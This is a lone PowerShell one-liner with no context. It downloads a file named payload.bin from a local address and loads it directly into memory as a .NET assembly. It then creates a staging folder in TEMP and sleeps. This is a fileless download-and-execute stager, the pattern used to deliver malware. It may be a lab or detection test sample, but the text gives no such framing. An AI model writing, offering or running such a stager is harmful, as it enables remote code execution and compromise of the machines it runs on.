
$PayloadBytes = (New-Object System.Net.WebClient).DownloadData('https://127.0.0.1/payload.bin'); [Reflection.Assembly]::Load($PayloadBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Start-Sleep -Seconds 9
